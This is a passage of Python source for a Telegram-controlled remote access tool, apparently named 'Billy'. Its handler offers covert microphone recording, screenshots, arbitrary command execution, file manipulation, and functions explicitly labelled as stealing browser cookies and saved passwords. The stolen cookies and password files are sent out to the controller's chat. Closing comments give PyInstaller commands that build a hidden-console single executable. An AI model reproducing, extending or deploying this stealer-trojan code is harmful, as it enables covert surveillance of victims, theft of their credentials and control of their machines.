        message = f'This mode allows you to record audio from microphone. \nSyntax: /{constants.MICROPHONE_RECORD_command} [device number] [time] (seconds, no more than {config.max_time_to_record_microphone} seconds).\nDevices:\n'
        for i in range(len(devices)):
            message += f"{i + 1}) {devices[i]['name']}\n"

        await send_message(call.message.chat.id, text=message, reply_markup=markup)

    elif req[0] == constants.SCREEN:                           # SCREEN
        await send_default_message(user_data, permission=constants.SCREEN, text=constants.SCREEN_preview, markup_arg=Screen.modes)

    elif req[0] == constants.SCREEN_GETSIZE:
        permission = Permissions.getPermission(constants.SCREEN_GETSIZE)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        width, height = Screen.get_size()

        await send_message(call.message.chat.id, text=f"{width} {height}", reply_markup=markup)

    elif req[0] == constants.SCREEN_SCREEN:
        permission = Permissions.getPermission(constants.SCREEN_SCREEN)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        error_flag, screen_path = Screen.screen()

        if error_flag:
            await send_message(call.message.chat.id, text=screen_path, reply_markup=markup)

        await bot.send_photo(call.message.chat.id, open(screen_path, 'rb'), reply_markup=markup)

        Screen.delete_tmp_file()

    elif req[0] == constants.BROWSER:                        # BROWSER
        await send_default_message(user_data, permission=constants.BROWSER, text=constants.BROWSER_preview, markup_arg=Browser.modes)

    elif req[0] == constants.BROWSER_OPENURL:
        message = f'This mode allows you to ropen url in a browser. \nSyntax: /{constants.BROWSER_OPENURL_command} [url].'

        await send_default_message(user_data, permission=constants.BROWSER_OPENURL, text=message)

    elif req[0] == constants.BROWSER_STEALCOOKIE:
        permission = Permissions.getPermission(constants.BROWSER_STEALCOOKIE)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        cookie_paths = Browser.steal_cookie()

        for browser, cookie in cookie_paths.items():
            await send_message(call.message.chat.id, text=browser + ':')

            if cookie[0]:
                await send_message(call.message.chat.id, cookie[1], reply_markup=markup)
                continue
            await bot.send_document(call.message.chat.id, open(cookie[1], 'rb'), reply_markup=markup)

        Browser.delete_tmp_cookies()

    elif req[0] == constants.BROWSER_STEALPASSWORDS:
        permission = Permissions.getPermission(
            constants.BROWSER_STEALPASSWORDS)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        passwords_path = Browser.steal_passwords()

        await bot.send_document(call.message.chat.id, open(passwords_path, 'rb'), reply_markup=markup)

        Browser.delete_tmp_passwords()

    elif req[0] == constants.FILE:                            # FILE
        await send_default_message(user_data, permission=constants.FILE, text=constants.FILE_preview, markup_arg=File.modes)

    elif req[0] == constants.FILE_GETINF:
        message = f"This mode allows you to get information about file or directory. \nSyntax: /{constants.FILE_GETINF_command} [path]."

        await send_default_message(user_data, permission=constants.FILE_GETINF, text=message)

    elif req[0] == constants.FILE_CREATEFILE:
        message = f"This mode allows you to create file. \nSyntax: /{constants.FILE_CREATEFILE_command} [path] {config.special_separator} [value]."

        await send_default_message(user_data, permission=constants.FILE_CREATEFILE, text=message)

    elif req[0] == constants.FILE_CREATEDIR:
        message = f"This mode allows you to create directory. \nSyntax: /{constants.FILE_CREATEDIR_command} [path]."

        await send_default_message(user_data, permission=constants.FILE_CREATEDIR, text=message)

    elif req[0] == constants.FILE_COPY:
        message = f"This mode allows you to copy file. \nSyntax: /{constants.FILE_COPY_command} [path1] {config.special_separator} [path2]."

        await send_default_message(user_data, permission=constants.FILE_COPY, text=message)

    elif req[0] == constants.FILE_REMOVE:
        message = f"This mode allows you to remove file or directory. \nSyntax: /{constants.FILE_REMOVE_command} [path]."

        await send_default_message(user_data, permission=constants.FILE_REMOVE, text=message)

    elif req[0] == constants.FILE_UPLOAD:
        message = f"This mode allows you to upload file to network drive. \nSyntax: /{constants.FILE_UPLOAD_command} [file path] {config.special_separator} [network name]."

        await send_default_message(user_data, permission=constants.FILE_UPLOAD, text=message)

    elif req[0] == constants.FILE_DOWNLOAD:
        message = f"This mode allows you to download file from network drive. \nSyntax: /{constants.FILE_DOWNLOAD_command} [network name] {config.special_separator} [file path]."

        await send_default_message(user_data, permission=constants.FILE_DOWNLOAD, text=message)

    elif req[0] == constants.PHOTO:                           # PHOTO
        await send_default_message(user_data, permission=constants.PHOTO, text=constants.PHOTO_preview, markup_arg=Photo.modes)

    elif req[0] == constants.PHOTO_OPENPHOTO:
        message = f"This mode allows you to open photo by link. \nSyntax: /{constants.PHOTO_OPENPHOTO_command} [link]."

        await send_default_message(user_data, permission=constants.PHOTO_OPENPHOTO, text=message)

    elif req[0] == constants.PHOTO_CHANGEWALLPAPERS:
        permission = Permissions.getPermission(
            constants.PHOTO_CHANGEWALLPAPERS)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        message = f"This mode allows you to change wallpapers by link. \nSyntax: /{constants.PHOTO_CHANGEWALLPAPERS_command} [link]."

        flag_error, photo_path = Photo.get_wallpaper_path()

        if flag_error:
            await send_message(call.message.chat.id, text=photo_path + message, reply_markup=markup)
            return

        await bot.send_photo(call.message.chat.id, photo=open(photo_path, 'rb'), caption=message, reply_markup=markup)

        Photo.delete_tmp_photo()

    elif req[0] == constants.COMMAND:                         # COMMAND
        await send_default_message(user_data, permission=constants.COMMAND, text=constants.COMMAND_preview, markup_arg=Command.modes)

    elif req[0] == constants.COMMAND_RUNCOMMAND:
        message = f"This mode allows you to run command. \nSyntax: /{constants.COMMAND_RUNCOMMAND_command} [command]."

        await send_default_message(user_data, permission=constants.COMMAND_RUNCOMMAND, text=message)

    elif req[0] == constants.RESTART:                         # RESTART
        markup = getMarkupModes()

        permission = Permissions.getPermission(constants.RESTART)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        await send_message(call.message.chat.id, text=Restart.restart(), reply_markup=markup)

    elif req[0] == constants.ABOUT:                           # ABOUT
        await send_default_message(user_data, permission=constants.ABOUT,
                                   text=constants.ABOUT_preview, markup_arg=About.modes)

    elif req[0] == constants.ABOUT_GETVERSION:
        await send_default_message(user_data, permission=constants.ABOUT_GETVERSION, callback=About.getVersion)

    elif req[0] == constants.ABOUT_AUTHOR:
        await send_default_message(user_data, permission=constants.ABOUT_AUTHOR, callback=About.getAuthor)

    elif req[0] == constants.TEMP:                            # TEMP
        message = "Sorry, but this function isn't supported."
        await send_default_message(user_data, permission=constants.TEMP, text=message)

    elif req[0] == constants.MENU:                             # MENU
        markup = getMarkupModes()

        permission = Permissions.getPermission(constants.MENU)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        await menu(call.message, valid_user=1)

    else:
        markup = getMarkupModes()

        await send_message(call.message.chat.id, text=f"Command not found: {req[0]}", reply_markup=markup)


async def send_default_message(message, permission, text=-1, markup_arg={}, callback=-1):
    permission = Permissions.getPermission(permission)
    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes(markup_arg)

    if callback != -1:
        text = callback()

    await send_message(id, text=text, reply_markup=markup)


async def send_message(id, text, reply_markup={}, parse_mode=0, disable_web_page_preview=False):
    texts = []

    text_length = len(text)
    max_length = 4090
    if text_length > max_length:
        start_symb, finish_symb = 0, get_finish_symb(text, max_length)

        while True:
            text_part = text[start_symb:finish_symb]
            texts.append(text_part)

            if finish_symb == -1:
                break

            start_symb, finish_symb = finish_symb, finish_symb + get_finish_symb(
                text[finish_symb:], max_length)
            if len(text[start_symb:]) < max_length:
                finish_symb = -1

    else:
        texts.append(text)

    for text_part in texts[:-1]:
        await bot.send_message(id, text=text_part, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)

    await bot.send_message(id, text=texts[-1], reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)


def get_finish_symb(text, max_length):
    length = 0

    if len(text) < max_length:
        return -1

    for part in text.split('\n'):
        part += '\n'
        if length + len(part) > max_length:
            return length

        length += len(part)


def getMarkupModes(modes={}, is_main=0, row_lenght=2):
    markup = types.InlineKeyboardMarkup()

    row = []
    count = 0
    for name, callback in modes.items():
        row.append(types.InlineKeyboardButton(name, callback_data=callback))
        if len(row) >= row_lenght or (len(modes) % 2 != 0 and count == len(modes) - 1):
            markup.add(*row)
            count += 2
            row = []

    if not is_main:
        markup.add(types.InlineKeyboardButton(
            constants.MENU_preview, callback_data=constants.MENU))
    return markup


def getarg(message, suffix):
    return message.replace('/' + suffix, '').strip()


def main():
    Environment.create()
    asyncio.run(bot.polling())


if __name__ == '__main__':
    main()

# WINDOWS
# pyinstaller --noconsole --hidden-import=yadisk.sessions --hidden-import=yadisk.sessions.requests_session --hidden-import=scipy._cyutility  --icon=data/icon.ico --onefile Billy.py

# LINUX
# pyinstaller --add-binary "/usr/lib/x86_64-linux-gnu/libportaudio.so:." --add-binary "/usr/lib/x86_64-linux-gnu/libpython3.11.so.1.0:." --paths "$(python3 -c 'import sys; print(sys.prefix)')/lib" --noconsole --hidden-import=yadisk.sessions --hidden-import=yadisk.sessions.requests_session --hidden-import=scipy._cyutility --onefile Billy.py
